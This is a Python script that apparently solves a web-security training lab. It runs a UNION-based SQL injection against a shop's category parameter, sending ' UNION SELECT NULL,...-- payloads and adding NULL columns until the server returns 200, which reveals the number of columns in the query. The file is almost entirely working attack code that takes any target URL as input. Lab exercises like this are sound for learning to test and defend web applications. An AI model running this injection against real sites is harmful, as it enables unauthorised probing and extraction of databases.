import sys
import logging
import urllib3


import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    nulls_list = ["NULL"]
    num_columns = None
    log.info("Determining number of columns.")
    while len(nulls_list) < 50:
        nulls = ",".join(nulls_list)
        category = f"' UNION SELECT {nulls}-- "
        resp = shop.get_category(category)
        if resp.status_code == 200:
            num_columns = len(nulls_list)
            break
        nulls_list.append("NULL")
    if num_columns:        
        log.info(f"Number of columns is : {num_columns}")
        shop.is_solved()
    else:
        log.info("Could not determine number of columns.")
        
    
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)